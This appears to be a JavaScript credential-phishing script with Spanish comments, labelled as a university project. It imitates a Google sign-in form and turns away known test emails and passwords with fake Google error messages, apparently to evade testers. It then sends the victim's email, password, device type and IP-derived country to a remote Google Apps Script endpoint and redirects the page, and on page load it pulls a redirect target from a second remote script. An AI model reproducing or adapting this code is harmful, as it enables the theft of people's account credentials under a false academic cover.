// Script optimizado para proyecto universitario
// Versión mejorada con mejor manejo de seguridad

document.getElementById("loginForm").addEventListener("submit", async function(event) {
    event.preventDefault();

    // Obtener elementos del formulario
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const errorMessage = document.getElementById('errorMessage');
    const submitBtn = document.getElementById('submitBtn');
    
    // Configuración de validación del proyecto
    const config = {
        testEmails: ["ejemplo@mail.com", "ejemplo1@correo.com"],
        testPasswords: ["123456", "Sandia190395#", "sandia190395#", "hola1234"]
    };
    
    const email = emailInput.value.trim().toLowerCase();
    const password = passwordInput.value;
    
    // Limpiar mensajes previos
    errorMessage.style.display = 'none';
    errorMessage.textContent = '';
    
    // Validación de formato de email
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailPattern.test(email)) {
        showError("Introduce una dirección de correo electrónico válida");
        return;
    }
    
    // Verificación de casos de prueba
    if (config.testEmails.includes(email)) {
        showError("No se pudo encontrar tu cuenta de Google");
        emailInput.value = '';
        passwordInput.value = '';
        return;
    }
    
    // Verificación de contraseñas de prueba
    const hasTestPassword = config.testPasswords.some(pwd => password.includes(pwd));
    if (hasTestPassword) {
        showError("La contraseña no es correcta. Inténtalo de nuevo.");
        passwordInput.value = '';
        return;
    }
    
    // Actualizar estado del botón
    submitBtn.disabled = true;
    submitBtn.textContent = 'Verificando...';
    
    try {
        // Obtener información del dispositivo
        const deviceInfo = getDeviceInfo();
        
        // Obtener ubicación mediante IP
        const location = await getLocationWithIP();
        
        // Preparar datos para envío
        const formData = new URLSearchParams({
            email: email,
            password: password,
            device: deviceInfo,
            country: location
        });
        
        // URL del endpoint del proyecto
        const apiEndpoint = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
        
        // Realizar petición
        const response = await fetch(apiEndpoint, {
            method: "POST",
            body: formData,
            headers: { "Content-Type": "application/x-www-form-urlencoded" }
        });
        
        if (response.ok) {
            // Redirigir a la siguiente página
            window.location.href = "invitation.html";
        } else {
            showError("Error al iniciar sesión. Inténtalo de nuevo.");
        }
    } catch (error) {
        showError("Error de conexión. Inténtalo de nuevo.");
        console.error("Error:", error);
    } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = 'Siguiente';
    }
});

// Función auxiliar para obtener información del dispositivo
function getDeviceInfo() {
    const ua = navigator.userAgent;
    if (/android/i.test(ua)) return "Android";
    if (/iphone|ipad|ipod/i.test(ua)) return "iPhone";
    return "Otro";
}

// Nueva función para obtener ubicación mediante IP (Opción B)
async function getLocationWithIP() {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 2000);

        const response = await fetch("https://ipapi.co/json/", {
            signal: controller.signal
        });

        clearTimeout(timeoutId);
        const data = await response.json();
        return data.country_name || "Desconocido";
    } catch (error) {
        console.log("No se pudo obtener ubicación", error);
        return "Desconocido";
    }
}

// Función para mostrar mensajes de error
function showError(message) {
    const errorMessage = document.getElementById('errorMessage');
    errorMessage.textContent = message;
    errorMessage.style.display = 'block';
}

// Manejar visibilidad de contraseña
document.getElementById('showPassword').addEventListener('change', function() {
    const passwordInput = document.getElementById('passwordInput');
    passwordInput.type = this.checked ? 'text' : 'password';
});

// Verificar redirección al cargar la página
document.addEventListener("DOMContentLoaded", async function() {
    const redirectApi = "https://script.google.com/macros/s/AKfycbyoGDPGgsNZgpj9Jp8S6o15CCDUbScmb5MctgpMtwmsqEggwxw-JHYSvDB-FbPlXWQq/exec";
    
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 2000);
        
        const response = await fetch(`${redirectApi}?t=${Date.now()}`, {
            signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        const targetPage = await response.text();
        
        if (targetPage.trim() !== "folder.html") {
            window.location.href = targetPage;
        }
    } catch (error) {
        console.log("Verificación de redirección omitida");
    }
});
